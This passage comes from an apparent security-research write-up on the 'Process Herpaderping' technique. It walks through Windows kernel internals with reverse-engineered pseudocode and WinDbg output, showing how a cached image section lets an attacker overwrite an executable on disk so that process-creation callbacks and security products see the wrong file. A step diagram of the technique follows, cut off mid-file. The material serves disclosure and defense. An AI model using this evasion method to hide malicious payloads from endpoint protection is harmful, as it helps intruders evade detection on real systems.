    CONTROL_AREA** ControlAreaOut)
{
    CONTROL_AREA* controlArea;
//...
    fileObject = CreateSectionPacket->FileObject;
    //  
    // Retrieve section object pointers. If SEC_IMAGE use ImageSectionObject 
    // otherwise use DataSectionObject
    //  
    controlArea = fileObject->SectionObjectPointer->DataSectionObject;
    if ((CreateSectionPacket->AllocateAttributes & SEC_IMAGE) != 0)
    {
        controlArea = fileObject->SectionObjectPointer->ImageSectionObject;
    }
//...
//
// Some exceptionally ugly lock loops and validation.
//
//...
            *ControlAreaOut = controlArea;
            return STATUS_SUCCESS;
//...
}

NTSTATUS __fastcall MiCreateImageOrDataSection(
    CREATE_SECTION_PACKET* CreateSectionPacket)
{
    NTSTATUS status;
    PFILE_OBJECT fileObject;
    CONTROL_AREA controlArea;
    CONTROL_AREA* newControlArea;
//...
    fileObject = CreateSectionPacket->InputFileObject;
    if (fileObject)
    {
        //
        // A file object was provided already, use it.
        //
        goto HaveFileObject;
    }
    if ((allocationAttributes & SEC_LARGE_PAGES) == 0)
    {
        //
        // Get the file object form the input file handle.
        //
        status = ObReferenceObjectByHandle(
                     CreateSectionPacket->InputFileHandle,
                     MmMakeFileAccess[CreateSectionPacket->PageProtectionMask & 7],
                     IoFileObjectType,
                     CreateSectionPacket->InputPreviousMode,
                     &fileObject,
                     NULL);
        if (!NT_SUCCESS(status))
        {
            goto Exit;
        }
        if (!fileObject->SectionObjectPointer)
        {
            //
            // If the file handle was used and there was not section crated for 
            // it already, this is a failure condition. 
            //
            status = STATUS_INVALID_FILE_FOR_SECTION;
            goto Exit;
        }

:HaveFileObject
//...
        //
        // Store some information in the packet and the local CONTROL_AREA to 
        // maintain state for further calls.
        //
        ObfReferenceObject(fileObject);
        CreateSectionPacket->FileObject = fileObject;
        controlArea.u.LongFlags = 2;
        controlArea.FilePointer.Value = fileObject;
        newControlArea = NULL;
//...
        while (1)
        {
//...
            //
            // Go reference the correct control area.
            //
            status = MiReferenceControlArea(CreateSectionPacket, 
                                            &controlArea, 
                                            &sectionControlArea);
            if (NT_SUCCESS(status))
            {
                break;
            }
            if ((status == 0xC000060B) || (status == 0xC0000476))
            {
                //
                // The control area is not charged or is invalid.
                //
                goto Exit;
            }
        }
        CreateSectionPacket->SectionControlArea = sectionControlArea;
        if ((sectionControlArea->u.LongFlags & 2) != 0)
        {
            //
            // We have the section control area which will have the reference 
            // section. Now, go create the new one.
            //
            status = MiCreateNewSection(CreateSectionPacket,
                                        &newControlArea);
            if (NT_SUCCESS(status)))
            {
//...
                CreateSectionPacket->SectionControlArea = newControlArea;
                goto Exit;
//...
Exit:
//...
    return status;
}
```

The above code shows that this path will reference the input file object and 
attempt to reuse the section from the control area to create a new section 
based on it. In our example, this returns to `MiCreateSection` which does some 
finalization. Let's go back to the debugger now and identify that file object. 
From my reverse engineering, I know that `CREATE_SECTION_PACKET` is stored on 
the stack from a higher call. I'll go identify that.

This is the structure `CREATE_SECTION_PACKET` in the stack starting at 
`InputFileHandle` and ending at `FileObject`. Between these fields there exists 
`InputFileObject`:
```
0: kd> dq fffffd89`f016b868 L3
fffffd89`f016b868  00000000`0000255c 00000000`00000000
fffffd89`f016b878  ffff998a`ae91ea20
```

The input file object is null, which is expected in this path. And the 
`InputFileHandle` is a handle to an almost identical  
[FILE_OBJECT][msdn.FILE_OBJECT] from the `EPROCESS` of the previous process. 
But it isn't the same. However, the `SectionObjectPointer` is the same for both 
objects.

```
0: kd> !handle 00000000`0000255c

PROCESS ffff998aab1b2480
    SessionId: 1  Cid: 12dc    Peb: 0099d000  ParentCid: 12b8
    DirBase: 1ab742000  ObjectTable: ffff8201fa4fa6c0  HandleCount: 2041.
    Image: explorer.exe

Handle table at ffff8201fa4fa6c0 with 2041 entries in use

255c: Object: ffff998aae91ea20  GrantedAccess: 00120089 (Protected) (Inherit) (Audit) Entry: ffff8201fbdf9570
Object: ffff998aae91ea20  Type: (ffff998aa54d3820) File
    ObjectHeader: ffff998aae91e9f0 (new version)
        HandleCount: 1  PointerCount: 32770
        Directory Object: 00000000  Name: \Users\jxy\Desktop\lol.exe {HarddiskVolume3}

0: kd> !object ffff998a`ae91ea20
Object: ffff998aae91ea20  Type: (ffff998aa54d3820) File
    ObjectHeader: ffff998aae91e9f0 (new version)
    HandleCount: 1  PointerCount: 32770
    Directory Object: 00000000  Name: \Users\jxy\Desktop\lol.exe {HarddiskVolume3}
0: kd> dt nt!_FILE_OBJECT ffff998a`ae91ea20
   +0x000 Type             : 0n5
   +0x002 Size             : 0n216
   +0x008 DeviceObject     : 0xffff998a`a73c8930 _DEVICE_OBJECT
   +0x010 Vpb              : 0xffff998a`a75ec2a0 _VPB
   +0x018 FsContext        : 0xffff8201`fa92a170 Void
   +0x020 FsContext2       : 0xffff8201`ff956940 Void
   +0x028 SectionObjectPointer : 0xffff998a`ae08aae8 _SECTION_OBJECT_POINTERS
   +0x030 PrivateCacheMap  : (null) 
   +0x038 FinalStatus      : 0n0
   +0x040 RelatedFileObject : (null) 
   +0x048 LockOperation    : 0 ''
   +0x049 DeletePending    : 0 ''
   +0x04a ReadAccess       : 0x1 ''
   +0x04b WriteAccess      : 0 ''
   +0x04c DeleteAccess     : 0 ''
   +0x04d SharedRead       : 0x1 ''
   +0x04e SharedWrite      : 0 ''
   +0x04f SharedDelete     : 0x1 ''
   +0x050 Flags            : 0xc0042
   +0x058 FileName         : _UNICODE_STRING "\Users\jxy\Desktop\lol.exe"
   +0x068 CurrentByteOffset : _LARGE_INTEGER 0x0
   +0x070 Waiters          : 0
   +0x074 Busy             : 0
   +0x078 LastLock         : (null) 
   +0x080 Lock             : _KEVENT
   +0x098 Event            : _KEVENT
   +0x0b0 CompletionContext : (null) 
   +0x0b8 IrpListLock      : 0
   +0x0c0 IrpList          : _LIST_ENTRY [ 0xffff998a`ae91eae0 - 0xffff998a`ae91eae0 ]
   +0x0d0 FileObjectExtension : (null) 
```

We now see how the [SECTION_OBJECT_POINTERS][msdn.SECTION_OBJECT_POINTERS] are 
shared between each [FILE_OBJECT][msdn.FILE_OBJECT]. The new bits from the file 
don't ever become mapped for a new process until all the 
[FILE_OBJECT][msdn.FILE_OBJECT] are reclaimed with the shared 
`SectionObjectPointer` and `ImageSectionObject`.

```
Breakpoint 0 hit
nt!MiClearFilePointer+0x5d:
fffff802`2f4f9385 ebe2            jmp     nt!MiClearFilePointer+0x41 (fffff802`2f4f9369)
3: kd> k
 # Child-SP          RetAddr           Call Site
00 fffffd89`f254f690 fffff802`2f56f501 nt!MiClearFilePointer+0x5d
01 fffffd89`f254f6c0 fffff802`2f56f4a9 nt!MiDestroySection+0x29
02 fffffd89`f254f6f0 fffff802`2f5eaca0 nt!MiCleanSection+0x6d
03 fffffd89`f254f790 fffff802`2f42324e nt!MiCheckControlArea+0x1c7a40
04 fffffd89`f254f800 fffff802`2f9da4c3 nt!MiDereferenceControlAreaBySection+0x2a
05 fffffd89`f254f830 fffff802`2fa189e0 nt!MiSectionDelete+0x83
06 fffffd89`f254f860 fffff802`2f4a1004 nt!ObpRemoveObjectRoutine+0x80
07 fffffd89`f254f8c0 fffff802`2fa6d64c nt!ObfDereferenceObject+0xa4
08 fffffd89`f254f900 fffff802`2fa26743 nt!PspRundownSingleProcess+0x16c
09 fffffd89`f254f980 fffff802`2fa5c4fb nt!PspExitThread+0x60b
0a fffffd89`f254fa90 fffff802`2f5d3c15 nt!NtTerminateProcess+0xeb
0b fffffd89`f254fb00 00007ffb`de0fc5f4 nt!KiSystemServiceCopyEnd+0x25
0c 00000025`020ff718 00000000`00000000 ntdll!NtTerminateProcess+0x14
```

## When is the image section cached? 
Given the information in the previous section, we know the image section object
is cached in the [FILE_OBJECT][msdn.FILE_OBJECT], this image section is then 
used as a "reference" image section when a new process is created, finally we 
know that this cached "reference" image section is shared between each 
[FILE_OBJECT][msdn.FILE_OBJECT]. 

But when is that initial section created and cached? This is strait forward to 
identify with some breakpoints:

```
2: kd> bp nt!NtCreateSection
2: kd> g
Breakpoint 1 hit
nt!NtCreateSection:
fffff804`3ebd9fe0 4053            push    rbx
3: kd> bp /w @$curprocess.Name.Contains("Herpaderp")
breakpoint 1 redefined
3: kd> g;k
0: kd> k
 # Child-SP          RetAddr               Call Site
00 fffff58c`00d83a08 fffff804`3e7d2e15     nt!NtCreateSection
01 fffff58c`00d83a10 00007fff`c0ebca04     nt!KiSystemServiceCopyEnd+0x25
02 00000012`076fe9e8 00007fff`c0e6b365     ntdll!NtCreateSection+0x14
03 00000012`076fe9f0 00007fff`c0e6b662     ntdll!CsrpConnectToServer+0x1b1
04 00000012`076febe0 00007fff`be7fadf2     ntdll!CsrClientConnectToServer+0xe2
05 00000012`076fec40 00007fff`be7faa5d     KERNELBASE!_KernelBaseBaseDllInitialize+0x212
06 00000012`076feec0 00007fff`c0e450a1     KERNELBASE!KernelBaseDllInitialize+0xd
07 00000012`076feef0 00007fff`c0e89405     ntdll!LdrpCallInitRoutine+0x65
08 00000012`076fef60 00007fff`c0e891f8     ntdll!LdrpInitializeNode+0x1b1
09 00000012`076ff0a0 00007fff`c0e89222     ntdll!LdrpInitializeGraphRecurse+0x80
0a 00000012`076ff0e0 00007fff`c0e4aa97     ntdll!LdrpInitializeGraphRecurse+0xaa
0b 00000012`076ff120 00007fff`c0e42591     ntdll!LdrpPrepareModuleForExecution+0xbf
0c 00000012`076ff160 00007fff`c0e422a8     ntdll!LdrpLoadDllInternal+0x199
0d 00000012`076ff1e0 00007fff`c0e41764     ntdll!LdrpLoadDll+0xa8
0e 00000012`076ff390 00007fff`c0ef4193     ntdll!LdrLoadDll+0xe4
0f 00000012`076ff480 00007fff`c0ee1df5     ntdll!LdrpInitializeProcess+0x1a0b
10 00000012`076ff8c0 00007fff`c0e91853     ntdll!_LdrpInitialize+0x50589
11 00000012`076ff960 00007fff`c0e917fe     ntdll!LdrpInitialize+0x3b
12 00000012`076ff990 00000000`00000000     ntdll!LdrInitializeThunk+0xe
0: kd> g;k
Breakpoint 1 hit
 # Child-SP          RetAddr               Call Site
00 fffff58c`00d83a08 fffff804`3e7d2e15     nt!NtCreateSection
01 fffff58c`00d83a10 00007fff`c0ebca04     nt!KiSystemServiceCopyEnd+0x25
02 00000012`076fdee8 00007ff7`511b6bcb     ntdll!NtCreateSection+0x14
03 00000012`076fdef0 00000012`076fe048     ProcessHerpaderping!Herpaderp::ExecuteProcess+0x4bb
1: kd> !handle 0xac

PROCESS ffffa78260243440
    SessionId: 2  Cid: 043c    Peb: 12075a2000  ParentCid: 2200
    DirBase: 36641002  ObjectTable: ffffd08243acfe00  HandleCount:  41.
    Image: ProcessHerpaderping.exe

Handle table at ffffd08243acfe00 with 41 entries in use

00ac: Object: ffffa782611330b0  GrantedAccess: 0012019f Entry: ffffd08246cef2b0
Object: ffffa782611330b0  Type: (ffffa782594fb2a0) File
    ObjectHeader: ffffa78261133080 (new version)
        HandleCount: 1  PointerCount: 32754
        Directory Object: 00000000  Name: \Users\Jxy\Desktop\lol.exe {HarddiskVolume4}

1: kd> dx ((nt!_FILE_OBJECT*)0xffffa782611330b0)->SectionObjectPointer
((nt!_FILE_OBJECT*)0xffffa782611330b0)->SectionObjectPointer                 : 0xffffa78260d1e708 [Type: _SECTION_OBJECT_POINTERS *]
    [+0x000] DataSectionObject : 0xffffa7825ce5fb30 [Type: void *]
    [+0x008] SharedCacheMap   : 0xffffa78260e24da0 [Type: void *]
    [+0x010] ImageSectionObject : 0x0 [Type: void *]
1: kd> ba w8 0xffffa78260d1e708+0x10
1: kd> g
Breakpoint 2 hit
nt!MiReferenceControlArea+0x129:
fffff804`3e62d7f1 33d2            xor     edx,edx
1: kd> k
 # Child-SP          RetAddr               Call Site
00 fffff58c`00d835c0 fffff804`3ebda7f1     nt!MiReferenceControlArea+0x129
01 fffff58c`00d83650 fffff804`3ebdac54     nt!MiCreateImageOrDataSection+0x171
02 fffff58c`00d83740 fffff804`3ebda2af     nt!MiCreateSection+0xf4
03 fffff58c`00d838c0 fffff804`3ebda040     nt!MiCreateSectionCommon+0x1ff
04 fffff58c`00d839a0 fffff804`3e7d2e15     nt!NtCreateSection+0x60
05 fffff58c`00d83a10 00007fff`c0ebca04     nt!KiSystemServiceCopyEnd+0x25
06 00000012`076fdee8 00007ff7`511b6bcb     ntdll!NtCreateSection+0x14
07 00000012`076fdef0 00000012`076fe048     ProcessHerpaderping!Herpaderp::ExecuteProcess+0x4bb
1: kd> dx ((nt!_FILE_OBJECT*)0xffffa782611330b0)->SectionObjectPointer
((nt!_FILE_OBJECT*)0xffffa782611330b0)->SectionObjectPointer                 : 0xffffa78260d1e708 [Type: _SECTION_OBJECT_POINTERS *]
    [+0x000] DataSectionObject : 0xffffa7825ce5fb30 [Type: void *]
    [+0x008] SharedCacheMap   : 0xffffa78260e24da0 [Type: void *]
    [+0x010] ImageSectionObject : 0xfffff58c00d83680 [Type: void *]
```

The above `WinDbg` output shows the image section object is cached within the 
first [FILE_OBJECT][msdn.FILE_OBJECT] at the call to 
[NtCreateSection][msdn.NtCreateSection]. We abuse this by forcing the OS to 
cache an image section object that will be used when process is executed. 
Before we begin execution of the process, we obscure the content on disk, 
the changes are not reflected in the cached image section.

There is an opportunity to inspect section creation from the kernel. 
[IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION][msdn.IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION]
is invoked when the file and section control area locks are acquired. However, 
there is not a clear indicator in the callback data, in this case, the 
callback data does not contain the `AllocationAttributes` (`SEC_IMAGE`). For 
the exploit, in this path, the `PageProtection` will only show `PAGE_READONLY`. 
There are no `AllocationAttributes`, a future release on Windows 10 will extend 
this data to include the `AllocationAttributes`. So, `SEC_IMAGE` will be 
available, however inspection here is not ideal as software will map in this 
manner without the intention of executing a new process. Placing a hook sooner 
in this call stack might help, but we run into the same complications with 
respect to processes creating a section in this manner without the intention 
of using it to execute a process.

I'll note here that the section this section is then mapped into the process at 
the `NtCreateProcess` call:

```
3: kd> k
 # Child-SP          RetAddr               Call Site
00 fffff58c`00d836d8 fffff804`3ed81a63     nt!PspAllocateProcess
01 fffff58c`00d836e0 fffff804`3eec5df5     nt!PspCreateProcess+0x233
02 fffff58c`00d839b0 fffff804`3e7d2e15     nt!NtCreateProcessEx+0x85
03 fffff58c`00d83a10 00007fff`c0ebca64     nt!KiSystemServiceCopyEnd+0x25
04 00000012`076fdee8 00007ff7`511b6d71     ntdll!NtCreateProcessEx+0x14
05 00000012`076fdef0 00000012`076fdf58     ProcessHerpaderping!Herpaderp::ExecuteProcess+0x661
3: kd> gu
nt!PspCreateProcess+0x233:
fffff804`3ed81a63 8bf0            mov     esi,eax
0: kd> gu
nt!NtCreateProcessEx+0x85:
fffff804`3eec5df5 4883c458        add     rsp,58h
0: kd> !process 0 0 lol.exe
PROCESS ffffa78260fb8080
    SessionId: 2  Cid: 02b4    Peb: e52ac5f000  ParentCid: 043c
    DirBase: 42546002  ObjectTable: ffffd0824a0f4a40  HandleCount:   3.
    Image: lol.exe

0: kd> .process /r /p ffffa78260fb8080
Implicit process is now ffffa782`60fb8080
.cache forcedecodeuser done
Loading User Symbols
PEB is paged out (Peb.Ldr = 000000e5`2ac5f018).  Type ".hh dbgerr001" for details
0: kd> !vad
VAD             Level         Start             End              Commit
ffffa782606ef080  3           7ffe0           7ffe0               1 Private      READONLY           
ffffa782606ef120  2           7ffeb           7ffeb               1 Private      READONLY           
ffffa782606f06b0  1         e52ac00         e52adff               1 Private      READWRITE          
ffffa7825d3fea50  3        20ba8dc0        20ba8dda               0 Mapped       READONLY           Pagefile section, shared commit 0x1b
ffffa7825d3ff630  2       7df5e58e0       7df5e58e0               0 Mapped       READONLY           Pagefile section, shared commit 0x1
ffffa7825d3ff590  3       7df5e58f0       7df5e5912               0 Mapped       READONLY           Pagefile section, shared commit 0x23
ffffa7825d3ff3b0  0       7df5e5920       7ff5e591f               2 Mapped       NO_ACCESS          Pagefile section, shared commit 0xdd6
ffffa7825d3fd8d0  1       7ff7f4200       7ff7f4264              29 Mapped  Exe  EXECUTE_WRITECOPY  \Users\Jxy\Desktop\lol.exe
ffffa7825d3fe4b0  2       7fffc0e20       7fffc100f              16 Mapped  Exe  EXECUTE_WRITECOPY  \Windows\System32\ntdll.dll

Total VADs: 9, average level: 2, maximum depth: 3
Total private commit: 0x32 pages (200 KB)
Total shared commit:  0xe7a pages (14824 KB)
```

## What this means for the process creation callback 
[PS_CREATE_NOTIFY_INFO][msdn.PS_CREATE_NOTIFY_INFO] contains a `FileObject`, 
which according to the documentation, is the file object of the process being 
created. How does [PS_CREATE_NOTIFY_INFO][msdn.PS_CREATE_NOTIFY_INFO] in the 
process creation callback get populated? Well `PspCallProcessNotifyRoutines` 
calls `PsReferenceProcessFilePointer` of course:

```cpp
NTSTATUS __fastcall PsReferenceProcessFilePointer(
    PEPROCESS Process, 
    PFILE_OBJECT* FileObject)
{
    NTSTATUS status;
    CONTROL_AREA* controlArea;

    status = STATUS_UNSUCCESSFUL;

    if (ExAcquireRundownProtection(&Process->RundownProtect))
    {
       if (Process->SectionObject)
       {
           controlArea = MiSectionControlArea(Process->SectionObject);
           *FileObject = MiReferenceControlAreaFile(controlArea);
           status = STATUS_SUCCESS;
       }

       ExReleaseRundownProtection(&Process->RundownProtect);
    }

    return status;
}
```

We see here it gets the `FileObject` from the `SectionObject` field in the 
`EPROCESS`. What does this mean for the callback? I wrote a simple test driver 
that registers for the callback and prints some debug info.

```
Process:    FFFF998AAC8DF080
ProcessId:  00000000000008C0
CreateInfo: FFFFFD89F16F8E20
  Flags:           0x00000000
  ParentProcessId: 0000000000001B90
  FileObject:      FFFF998AB534DAA0
  ImageFileName:   "\Users\jxy\Desktop\lol.exe"
  CommandLine:     ""
```
```
0: kd> dt nt!_FILE_OBJECT FFFF998AB534DAA0
   +0x000 Type             : 0n5
   +0x002 Size             : 0n216
   +0x008 DeviceObject     : 0xffff998a`a73c8930 _DEVICE_OBJECT
   +0x010 Vpb              : 0xffff998a`a75ec2a0 _VPB
   +0x018 FsContext        : 0xffff8202`23a8a170 Void
   +0x020 FsContext2       : 0xffff8202`23a8a3d0 Void
   +0x028 SectionObjectPointer : 0xffff998a`b5aa1118 _SECTION_OBJECT_POINTERS
   +0x030 PrivateCacheMap  : (null) 
   +0x038 FinalStatus      : 0n0
   +0x040 RelatedFileObject : 0xffff998a`b239c560 _FILE_OBJECT
   +0x048 LockOperation    : 0 ''
   +0x049 DeletePending    : 0 ''
   +0x04a ReadAccess       : 0x1 ''
   +0x04b WriteAccess      : 0x1 ''
   +0x04c DeleteAccess     : 0 ''
   +0x04d SharedRead       : 0x1 ''
   +0x04e SharedWrite      : 0x1 ''
   +0x04f SharedDelete     : 0x1 ''
   +0x050 Flags            : 0x44042
   +0x058 FileName         : _UNICODE_STRING "\Users\jxy\Desktop\lol.exe"
   +0x068 CurrentByteOffset : _LARGE_INTEGER 0x44600
   +0x070 Waiters          : 0
   +0x074 Busy             : 0
   +0x078 LastLock         : (null) 
   +0x080 Lock             : _KEVENT
   +0x098 Event            : _KEVENT
   +0x0b0 CompletionContext : (null) 
   +0x0b8 IrpListLock      : 0
   +0x0c0 IrpList          : _LIST_ENTRY [ 0xffff998a`b534db60 - 0xffff998a`b534db60 ]
   +0x0d0 FileObjectExtension : (null) 
```

That's the same access that I opened the file with to create the section. Let's 
try something. Let's run `ProcessHerpaderping` with the `--exclusive` option. 
This will hold the initial file handle open with exclusive rights.

```
Process:    FFFF998AB2BD5080
ProcessId:  0000000000001C10
CreateInfo: FFFFFD89F1B1DE20
  Flags:           0x00000000
  ParentProcessId: 000000000000255C
  FileObject:      FFFF998AB21A6330
  ImageFileName:   "\Users\jxy\Desktop\lol.exe"
  CommandLine:     ""

0: kd> dt nt!_FILE_OBJECT FFFF998AB21A6330
   +0x000 Type             : 0n5
   +0x002 Size             : 0n216
   +0x008 DeviceObject     : 0xffff998a`a73c8930 _DEVICE_OBJECT
   +0x010 Vpb              : 0xffff998a`a75ec2a0 _VPB
   +0x018 FsContext        : 0xffff8202`23a8a170 Void
   +0x020 FsContext2       : 0xffff8202`21292760 Void
   +0x028 SectionObjectPointer : 0xffff998a`b5aa1118 _SECTION_OBJECT_POINTERS
   +0x030 PrivateCacheMap  : 0xffff998a`ab2d3a68 Void
   +0x038 FinalStatus      : 0n0
   +0x040 RelatedFileObject : 0xffff998a`b239dcd0 _FILE_OBJECT
   +0x048 LockOperation    : 0 ''
   +0x049 DeletePending    : 0 ''
   +0x04a ReadAccess       : 0x1 ''
   +0x04b WriteAccess      : 0x1 ''
   +0x04c DeleteAccess     : 0 ''
   +0x04d SharedRead       : 0 ''
   +0x04e SharedWrite      : 0 ''
   +0x04f SharedDelete     : 0 ''
   +0x050 Flags            : 0x40042
   +0x058 FileName         : _UNICODE_STRING "\Users\jxy\Desktop\lol.exe"
   +0x068 CurrentByteOffset : _LARGE_INTEGER 0x44600
   +0x070 Waiters          : 0
   +0x074 Busy             : 0
   +0x078 LastLock         : (null) 
   +0x080 Lock             : _KEVENT
   +0x098 Event            : _KEVENT
   +0x0b0 CompletionContext : (null) 
   +0x0b8 IrpListLock      : 0
   +0x0c0 IrpList          : _LIST_ENTRY [ 0xffff998a`b21a63f0 - 0xffff998a`b21a63f0 ]
   +0x0d0 FileObjectExtension : (null) 
```

I control this file access now. Meaning, I may hold this handle open and 
prevent others from accessing the file. While this isn't horrible for the 
kernel callback, it means any downstream logic that that makes the assumption 
they can open the file with read access will be broken. Well, such logic would have 
already been broken, given that I've overwritten the file content. And the kernel callback 
is boned too, since reading directly from the file using that 
[FILE_OBJECT][msdn.FILE_OBJECT] will just read the wrong data.

### But wait, there's more...
This also means if I try to execute that process again, it does not work! I get 
a sharing violation. From user mode, without access to that original target 
file handle, no one may conventionally execute the process.

[//]: # (Hyperlink IDs)
[github.wil]: https://github.com/microsoft/wil
[github.phnt]: https://github.com/processhacker/phnt
[msdn.PsSetCreateProcessNotifyRoutineEx]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex
[msdn.PsSetCreateProcessNotifyRoutineEx2]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex2
[msdn.PsSetCreateThreadNotifyRoutineEx]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex
[msdn.PSCREATETHREADNOTIFYTYPE]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ne-ntddk-_pscreatethreadnotifytype
[msdn.PSCREATEPROCESSNOTIFYTYPE]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ne-ntddk-_pscreateprocessnotifytype
[msdn.IRP_MJ_CLEANUP]: https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-cleanup
[msdn.NtCreateSection]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
[msdn.SEC_IMAGE]: https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
[msdn.IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/flt-parameters-for-irp-mj-acquire-for-section-synchronization
[msdn.IRP_MJ_WRITE]: https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-write 
[msdn.FILE_OBJECT]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_file_object
[msdn.SECTION_OBJECT_POINTERS]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_section_object_pointers
[msdn.PS_CREATE_NOTIFY_INFO]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-_ps_create_notify_info

```

`res/StateDiagram.svg`:

```svg
<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" contentScriptType="application/ecmascript" contentStyleType="text/css" height="1440px" preserveAspectRatio="none" style="width:660px;height:1440px;" version="1.1" viewBox="0 0 660 1440" width="660px" zoomAndPan="magnify"><defs><filter height="300%" id="fq3covrjt0ivw" width="300%" x="-1" y="-1"><feGaussianBlur result="blurOut" stdDeviation="2.0"/><feColorMatrix in="blurOut" result="blurOut2" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 .4 0"/><feOffset dx="4.0" dy="4.0" in="blurOut2" result="blurOut3"/><feBlend in="SourceGraphic" in2="blurOut3" mode="normal"/></filter></defs><g><ellipse cx="386.5" cy="18" fill="#000000" filter="url(#fq3covrjt0ivw)" rx="10" ry="10" style="stroke: none; stroke-width: 1.0;"/><g id="CreateFile"><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="52.7031" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="218" x="277.5" y="88"/><line style="stroke: #A80036; stroke-width: 1.5;" x1="277.5" x2="495.5" y1="115.6094" y2="115.6094"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="66" x="353.5" y="107.5332">CreateFile</text><text fill="#000000" font-family="sans-serif" font-size="12" lengthAdjust="spacingAndGlyphs" textLength="198" x="282.5" y="133.0664">Create target file, keep handle open.</text></g><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="40" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="77" x="348" y="201"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="67" x="353" y="226.7285">FileHandle</text><g id="Write"><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="52.7031" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="214" x="84.5" y="301"/><line style="stroke: #A80036; stroke-width: 1.5;" x1="84.5" x2="298.5" y1="328.6094" y2="328.6094"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="33" x="175" y="320.5332">Write</text><text fill="#000000" font-family="sans-serif" font-size="12" lengthAdjust="spacingAndGlyphs" textLength="194" x="89.5" y="346.0664">Write source payload into target file.</text></g><g id="NtCreateSection"><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="52.7031" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="197" x="93" y="414"/><line style="stroke: #A80036; stroke-width: 1.5;" x1="93" x2="290" y1="441.6094" y2="441.6094"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="103" x="140" y="433.5332">NtCreateSection</text><text fill="#000000" font-family="sans-serif" font-size="12" lengthAdjust="spacingAndGlyphs" textLength="177" x="98" y="459.0664">Create section using file handle.</text></g><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="40" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="101" x="139" y="527"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="91" x="144" y="552.7285">SectionHandle</text><g id="NtCreateProcessEx"><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="52.7031" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="363" x="6" y="627"/><line style="stroke: #A80036; stroke-width: 1.5;" x1="6" x2="369" y1="654.6094" y2="654.6094"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="122" x="126.5" y="646.5332">NtCreateProcessEx</text><text fill="#000000" font-family="sans-serif" font-size="12" lengthAdjust="spacingAndGlyphs" textLength="343" x="11" y="672.0664">Image section for process is mapped and cached in file object.</text></g><g id="Modify"><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="52.7031" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="152" x="240.5" y="740"/><line style="stroke: #A80036; stroke-width: 1.5;" x1="240.5" x2="392.5" y1="767.6094" y2="767.6094"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="41" x="296" y="759.5332">Modify</text><text fill="#000000" font-family="sans-serif" font-size="12" lengthAdjust="spacingAndGlyphs" textLength="132" x="245.5" y="785.0664">Obscure the file on disk.</text></g><g id="NtCreateThreadEx"><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="67.7969" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="218" x="160.5" y="853"/><line style="stroke: #A80036; stroke-width: 1.5;" x1="160.5" x2="378.5" y1="880.6094" y2="880.6094"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="117" x="211" y="872.5332">NtCreateThreadEx</text><text fill="#000000" font-family="sans-serif" font-size="12" lengthAdjust="spacingAndGlyphs" textLength="154" x="165.5" y="898.0664">The cached section is used.</text><text fill="#000000" font-family="sans-serif" font-size="12" lengthAdjust="spacingAndGlyphs" textLength="198" x="165.5" y="913.1602">Process notify routines fire in kernel.</text></g><ellipse cx="305.5" cy="1419" fill="none" filter="url(#fq3covrjt0ivw)" rx="10" ry="10" style="stroke: #000000; stroke-width: 1.0;"/><ellipse cx="306" cy="1419.5" fill="#000000" rx="6" ry="6" style="stroke: none; stroke-width: 1.0;"/><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="40" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="69" x="389" y="1081"/><text fill="#000000" font-family="sans-serif" font-size="14" 